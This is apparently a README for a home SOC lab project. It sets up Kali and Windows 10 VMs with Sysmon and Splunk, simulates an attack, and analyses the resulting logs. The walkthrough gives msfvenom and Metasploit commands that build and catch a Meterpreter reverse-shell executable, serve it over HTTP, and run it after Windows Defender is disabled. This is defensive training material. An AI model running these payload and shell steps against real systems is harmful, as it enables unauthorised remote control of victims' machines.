<p align="center">
<img src="https://i.imgur.com/yjaxtnl.gif" alt="Basic Home SOC Lab Steps"/>
</p>

<br>
<h1>Building a Basic Home SOC Lab for Threat Detection and Analysis</h1>



<h2>Project Description</h2>
This project details the setup of a fundamental Security Operations Center (SOC) lab environment utilizing VirtualBox. The lab integrates a Kali Linux virtual machine (VM) for simulating attacks and a Windows 10 VM configured with Sysmon and Splunk for advanced log collection and centralized security information and event management (SIEM) capabilities. The objective is to demonstrate the process of launching a simulated attack (using Nmap, msfvenom, and Metasploit) to establish a reverse TCP shell, interpret detailed telemetry via Sysmon, and analyze attack patterns and behaviors within Splunk to understand real-time detection opportunities. This project showcases practical skills in cybersecurity lab setup, offensive security simulation, and defensive security analysis.



<h2>Environments and Technologies Used</h2>

- <b>Virtualization:</b> VirtualBox
- <b>SIEM:</b> Splunk Enterprise
- <b>Endpoint Telemetry:</b> Sysmon
- <b>Offensive Security Tools:</b> Nmap, Msfvenom, Metasploit Framework



<h2>Operating Systems Used</h2>

- <b>Kali Linux VM:</b> Used as the attacker machine, hosting offensive security tools.
- <b>Windows 10 VM:</b> Configured as the victim machine, with security tools for log generation and aggregation.



<h2>Overview of Steps</h2>
1. <b>Virtual Machine Setup:</b> Creation of isolated Kali Linux and Windows 10 VMs within VirtualBox to establish a sandboxed lab environment.
<br>
2. <b>Defensive Tool Deployment:</b> Installation and configuration of Sysmon and Splunk on the Windows 10 VM for comprehensive log aggregation and analysis.
<br>
3. <b>Offensive Simulation:</b> Utilization of msfvenom, Metasploit, and Nmap to generate a malware payload, establish a reverse TCP shell connection, and conduct network scanning to generate security logs.
<br>
4. <b>Log Ingestion and Analysis:</b> Configuration of Splunk to ingest Sysmon-generated logs, followed by analysis of these logs to identify and interpret attack patterns.


<p>
<h2>Project Walkthrough</h2>
<h3> Step 1: Virtual Machine Setup </h3>
1. Download VirtualBox and its associated hash file. Verify the integrity of the downloaded VirtualBox installer by comparing its SHA256 hash with the one provided on the official VirtualBox website. This confirms that the file was not corrupted during transit. <br>
<img src="" alt="Disk Sanitization Steps"/>
<br>
<img src="https://i.imgur.com/4a3jLg3.png" alt="Disk Sanitization Steps"/>
<br>
2. Install VirtualBox. Prepare the Windows 10 virtual machine by installing the Windows ISO file.
<br>
<img src="https://i.imgur.com/rYoTIzL.png" alt="Basic Home SOC Lab Steps"/>
<br />
3. Configure the Windows 10 VM settings, including assigning 5120 MB of base memory and 4 processors (Always remember to choose your memory and processor settings according to your system capacity). Set the network adapter to "Internal Network" with the name 'mytest' to ensure a sandboxed environment.
<br>
<img src="https://i.imgur.com/617njbE.png" alt="Basic Home SOC Lab Steps"/>
<br />
4. Download a pre-built Kali Linux virtual machine image from the official Kali Linux website, specifically designed for VirtualBox. Set up the Kali Linux VM in VirtualBox. Configure its settings, including assigning 2048 MB of base memory and 4 processors.
<br>
<img src="https://i.imgur.com/nRpMGec.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/sJV0QRq.png" alt="Basic Home SOC Lab Steps"/>
<br>
5. To ensure a completely isolated environment, create an internal network named 'mytest' in the network adapter settings for both the Kali Linux and Windows 10 VMs. This isolates the lab from the host machine and external networks.
<br>
<img src="https://i.imgur.com/sVbKyvJ.png" alt="Basic Home SOC Lab Steps"/>
<br>
6. Take snapshots of both VMs' states. This provides a backup to revert to a known working state if any configuration errors occur.
<br>
<img src="https://i.imgur.com/XxKSAAS.png" alt="Basic Home SOC Lab Steps"/>
<br>
<h3> Step 2: Network Configuration</h3>
1. Within the Windows 10 VM, navigate to the network adapter settings, locate the IPv4 configuration, and assign a static IP address to the virtual network adapter.
<br>
<img src="https://i.imgur.com/wWsmInc.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/CFUoWpO.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/d8L2Ys7.png" alt="Basic Home SOC Lab Steps"/>
<br>
2. Configure the Kali Linux VM with a static IP address. This is done by editing the wired connection settings and manually setting the IP address, netmask, and gateway. <i>Temporarily change the adapter setting to NAT for internet connectivity to download Sysmon and Splunk on the Windows VM, then revert to the internal network. </i>
<br>
<img src="https://i.imgur.com/8Oee3q9.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/OTGxo18.png" alt="Basic Home SOC Lab Steps"/>
<br>
<h3> Step 3: Defensive Tool Deployment (Windows 10 VM)</h3>
<br>
1. Access the main webpage for Sysmon on the Windows VM and then navigate to its GitHub page to download the Sysmon configuration repository's raw data. 
<br>
<img src="https://i.imgur.com/d8bskfs.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/m7ouL8r.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/K9RjhyV.png" alt="Basic Home SOC Lab Steps"/>
<br>
2. Extract the downloaded Sysmon files within the Windows VM.
<br>
<img src="https://i.imgur.com/eYRprN7.png" alt="Basic Home SOC Lab Steps"/>
<br>
3. Open PowerShell as administrator, navigate to the directory where Sysmon was extracted, and use the command to install Sysmon onto the system with the desired configuration.
<br>
<img src="https://i.imgur.com/1WcNCCU.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/fLCFNsO.png" alt="Basic Home SOC Lab Steps"/>
<br>
4. Confirm Sysmon's successful installation by checking the list of running services on the Windows VM.
<br>
<img src="https://i.imgur.com/b3E5X4O.png" alt="Basic Home SOC Lab Steps"/>
<br>
5. Download Splunk Enterprise and proceed with its installation on the Windows VM. After the installation, log into the Splunk web interface via a browser within the Windows VM.
<br>
<img src="https://i.imgur.com/l4kRr6M.png" alt="Basic Home SOC Lab Steps"/>
<br>
<h3> Step 4: Offensive Simulation (Kali Linux VM & Windows 10 VM)</h3>
1. From the Kali Linux machine, use Nmap (e.g., nmap -A [Windows_VM_IP_Address] -Pn) to scan the Windows 10 VM and identify open ports and services.
<br>
<img src="https://i.imgur.com/YTJAUkw.png" alt="Basic Home SOC Lab Steps"/>
<br>
2. Use msfvenom to create a malware payload designed to establish a reverse shell.
<br>
<img src="https://i.imgur.com/OqC0ItW.png" alt="Basic Home SOC Lab Steps"/>
<br>
Identify available payloads using <i>msfvenom --l payloads </i>
<br>
<img src="https://i.imgur.com/PDdvU4u.png" alt="Basic Home SOC Lab Steps"/>
<br>
Select the <i>windows/x64/meterpreter_reverse_tcp</i> payload.
<br>
<img src="https://i.imgur.com/i9se2bg.png" alt="Basic Home SOC Lab Steps"/>
<br>
Construct the malware using a command similar to <i>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=[Kali_IP] LPORT=[Port] -f exe -o malware.exe </i>, where LHOST is the Kali Linux machine's IP address. 
<br>
<img src="https://i.imgur.com/F7dYAZe.png" alt="Basic Home SOC Lab Steps"/>
<br>
3. Set Up Metasploit Listener. Open <i>msfconsole</i> on the Kali Linux Machine. Configure a multi-handler to listen for the incoming connection by setting the payload type <i>set payload windows/x64/meterpreter_reverse_tcp</i> and the LHOST to the Kali Linux VM's IP Address. Then start the exploit with the command <i>exploit</i> to initiate the listener
<br>
<img src="https://i.imgur.com/bRgFSm1.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/6z0fqr0.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/CpisCKg.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/FuSSrUn.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/R0p7T2M.png" alt="Basic Home SOC Lab Steps"/>
<br>
4. Host Payload wiht HTTP Server. Set up a simple HTTP server on the Kali Linux machine to host the generated malware payload, allowing the Windows VM to download it. This typically involves opening a new terminal tab and using a command like <i>python3 -m http.server [port]</i>
<br>
<img src="https://i.imgur.com/jlBPEqu.png" alt="Basic Home SOC Lab Steps"/>
<br>
5. Disable Windows Defender: On the Windows 10 VM, temporarily disable Windows Defender to allow the simulated malware to execute without immediate detection.
<br>
<img src="https://i.imgur.com/GGDJlfE.png" alt="Basic Home SOC Lab Steps"/>
<br>
6. Download and Execute Malware: Open a web browser on the Windows VM, navigate to the Kali Linux machine's IP address and port <i> http://[Kali_IP]:[Port]/malware.exe</i>, and download the payload. Execute the downloaded malware.
<br>
<img src="https://i.imgur.com/yFZT8lA.png" alt="Basic Home SOC Lab Steps"/>
<br>
7. Verify Reverse Shell: Open a command prompt (cmd) on the Windows machine and verify that a connection has been established to the Kali Linux machine. On the Kali Linux VM, confirm the established Meterpreter session and type <i>shell</i> to gain a command-line interface on the compromised Windows machine.
<br>
<img src="https://i.imgur.com/kO5wWkQ.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/p1pPuzI.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/BXWGPB2.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/miaKVss.png" alt="Basic Home SOC Lab Steps"/>
<br>
<h3> Step 5: Splunk Log Analysis</h3>
1. Configure Splunk for Sysmon Logs: Ensure that Splunk is configured to ingest Sysmon logs. This often involves adjusting the input.conf file in Splunk to define the source type and directory for Sysmon events. Additionally, create a new index in the Splunk console for these logs.
<br>
<img src="https://i.imgur.com/2Lgc0jC.png" alt="Basic Home SOC Lab Steps"/>
<br>
<img src="https://i.imgur.com/YXzCH8N.png" alt="Basic Home SOC Lab Steps"/>
<br>
2. Analyze Attack Patterns in Splunk: After the malware execution, search specifically for the malware's filename or related process events within Splunk. Observe the logs to identify attack patterns and behaviors, understanding how Sysmon telemetry contributes to detection.
<br>
<img src="https://i.imgur.com/61Giuk7.png" alt="Basic Home SOC Lab Steps"/>
<br>
</p>

<h2>Key Learning/Reflections</h2>
This project offered significant insights into building a practical cybersecurity lab and performing basic threat detection. Key learnings include:
<br>
- <b>Lab Environment Setup:</b> Gained hands-on experience in configuring a realistic, sandboxed environment for cybersecurity practice using virtualization. This included managing network settings and ensuring inter-VM communication.
<br>
- <b>Log Management And SIEM Integration:</b> Developed a deeper understanding of how Sysmon collects granular system telemetry and how Splunk ingests, indexes, and enables analysis of these logs. This reinforced the importance of comprehensive logging for visibility into system activities.
<br>
- <b>Threat Simulation and Analysis:</b> Successfully simulated an attack chain, from reconnaissance (Nmap) to payload generation (msfvenom) and exploitation (Metasploit). Analyzing the generated logs in Splunk provided practical experience in identifying attack artifacts and understanding attacker behavior from a defender's perspective.
<br>
- <b>Challenges and Troubleshooting:</b> Encountered and resolved issues related to payload creation and sysmon integration with Splunk for correct log ingestion. This highlighted the iterative nature of lab setup and the importance of systematic troubleshooting.
<br>
- <b>Defensive Capabilities:</b> Reinforced the value of a SIEM in correlating disparate log sources to detect anomalies and malicious activities that might otherwise go unnoticed.
<br>
<h2>Conclusion</h2>
This project successfully established a functional home SOC lab, effectively demonstrating the end-to-end process of setting up a secure environment, collecting and aggregating logs, and performing basic threat detection through simulated attacks. The hands-on experience gained in configuring VirtualBox, deploying Sysmon and Splunk, and analyzing security events directly enhances practical skills relevant to security operations, incident response, and threat intelligence. This foundational lab provides a scalable base for further exploration into advanced threat detection techniques and security tool integration.
